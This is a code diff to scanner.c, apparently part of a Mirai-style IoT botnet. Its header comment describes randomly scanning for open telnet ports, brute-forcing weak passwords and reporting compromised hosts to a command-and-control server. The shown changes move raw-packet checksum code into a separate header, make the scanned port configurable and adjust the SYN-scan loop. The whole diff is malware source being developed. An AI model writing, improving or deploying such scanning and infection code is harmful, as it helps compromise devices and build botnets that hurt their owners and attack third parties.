@@ -1,5 +1,5 @@
 /* scanner.c
-p* 1.randomly scan whelther host opened port 23
+ * 1.randomly scan whelther host opened port 23
  * 2.if the host opens port 23, perform weak password attack
  * 3.if telnet login succeeds, report host information to CNC
  * 
@@ -23,6 +23,7 @@ p* 1.randomly scan whelther host opened port 23
 #include "mt_random.h"
 #include "customize.h"
 #include "scanner.h"
+#include "checksum.h"
 
 static uint8_t raw_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
 static int rawsock;
@@ -38,8 +39,6 @@ static ipv4_t scan_get_random_ip()
 	do
 	{
 		rand_ip = rand_genrand_int32();
-		//convert address to network byte order
-		//rand_ip = htonl(rand_ip);
 
 		part1 = (rand_ip >> 0) & 0xff;	
 		part2 = (rand_ip >> 8) & 0xff;
@@ -97,68 +96,6 @@ static void scan_fill_tcphdr_fixed(struct tcphdr* tcph)
 	tcph->syn = 1;
 }
 
-static uint16_t scan_checksum_ip(uint16_t* tiph, int hlength)
-{
-	register uint32_t checksum = 0;	
-	while (hlength > 1)
-	{
-		checksum += *tiph++;
-		hlength -= 2;
-	}
-	if (hlength> 0)
-	{
-#ifdef BIG_ENDIAN
-		checksum+=(*(uint8_t*)tiph)<<8;
-#else
-		checksum+=*(uint8_t*)tiph;
-#endif
-	}
-	//TODO:	until the carry is zero
-	while (checksum >> 16)
-	{
-		checksum = (checksum >> 16)	 + (checksum & 0xffff);
-	}
-
-	return (uint16_t)(~checksum);
-}
-
-static uint16_t scan_checksum_tcpudp(struct iphdr *iph, uint16_t *tcpudphd, uint16_t data_len)
-{
-	register uint32_t checksum = 0;
-	uint32_t ip_src = iph->saddr;
-	uint32_t ip_dst = iph->daddr;
-	int len = data_len;
-	
-	while(len > 1)
-	{
-		checksum += *tcpudphd++;
-		len -= 2;
-	}
-	if (len > 0)
-	{
-#ifdef BIG_ENDIAN
-		checksum+=(*(uint8_t*)tcpudphd) << 8;
-#else
-		checksum+=*(uint8_t*)tcpudphd;
-#endif
-	}
-
-	checksum += (ip_src >> 16) & 0xffff;
-	checksum += ip_src & 0xffff;
-	checksum += (ip_dst >> 16) & 0xffff;
-	checksum += ip_dst & 0xffff;
-	checksum += htons(iph->protocol);
-	checksum += data_len;
-
-	//Util carry is zero
-	while(checksum >> 16)
-	{
-		checksum = (checksum >> 16)	+ (checksum & 0xffff);
-	}
-
-	return (uint16_t)(~checksum);
-}
-
 static void scan_telnet_go()
 {
 	struct iphdr *iph;
@@ -187,13 +124,13 @@ static void scan_telnet_go()
 			tiph->daddr = scan_get_random_ip();
 			//tiph->daddr = INET_ADDR(118,89,62,21);
 			tiph->check = 0;
-			tiph->check = scan_checksum_ip((uint16_t*)tiph, sizeof(struct iphdr));
+			tiph->check = checksum_ip((uint16_t*)tiph, sizeof(struct iphdr));
 
 			//fill target tcp segment
-			ttcph->dest = htons(23);
+			ttcph->dest = htons(scan_port);
 			ttcph->seq = tiph->daddr;
 			ttcph->check = 0;
-			ttcph->check = scan_checksum_tcpudp(tiph, (uint16_t*)ttcph, (uint16_t)sizeof(struct tcphdr));
+			ttcph->check = checksum_tcpudp(tiph, (uint16_t*)ttcph, (uint16_t)sizeof(struct tcphdr));
 
 
 			taddr.sin_family = AF_INET;
@@ -254,7 +191,7 @@ static void scan_telnet_go()
 				continue;	
 			}
 
-			if (rtcph->source != htons(23))
+			if (rtcph->source != htons(scan_port))
 			{
 				//printf("from %d---->", ntohs(rtcph->source));
 				continue;	
@@ -291,6 +228,8 @@ static void scan_telnet_go()
 
 			if (i++ == 120)
 			{
+				riph = NULL;
+				rtcph = NULL;
 				break;
 			}
 		}
